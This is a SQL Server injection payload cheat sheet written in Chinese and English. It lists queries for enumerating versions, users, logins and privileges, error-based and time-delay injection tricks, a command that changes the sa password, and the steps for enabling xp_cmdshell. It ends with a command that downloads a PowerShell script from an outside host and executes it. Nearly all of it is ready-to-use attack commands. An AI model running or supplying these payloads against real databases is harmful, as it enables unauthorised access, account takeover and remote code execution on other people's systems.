SQL Server Payload
=====================================

常见Payload
----------------------------------------
- Version
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x01 - 0x20``
- 用户信息
    - ``SELECT user_name()``
    - ``SELECT system_user``
    - ``SELECT user``
    - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- 用户权限
    - ``select IS_SRVROLEMEMBER('sysadmin')``
    - ``select IS_SRVROLEMEMBER('db_owner')``
- List User
    - ``SELECT name FROM master..syslogins``
- 数据库信息
    - ``SELECT name FROM master..sysdatabases``
    - ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
- 执行命令
    - ``EXEC xp_cmdshell 'net user'``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
    - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
- Trick
    - ``id=1 union:select password from:user``
- 文件读取
    - OpenRowset
- 当前查询语句
    - ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
- hostname
    - 用于判断是否站库分离
    - ``select host_name()``

报错注入
----------------------------------------
- ``1=convert(int,(db_name()))``

常用函数
----------------------------------------
- SUSER_NAME()
- USER_NAME()
- PERMISSIONS()
- DB_NAME()
- FILE_NAME()
- TYPE_NAME()
- COL_NAME()

常用功能
----------------------------------------
- 开启cmdshell:

::

    EXEC sp_configure 'Show Advanced Options', 1;
    reconfigure;
    sp_configure;
    EXEC sp_configure 'xp_cmdshell', 1
    reconfigure;
    xp_cmdshell "whoami" 


- 下载并执行文件：

::

    xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.32/shell.ps1\");" 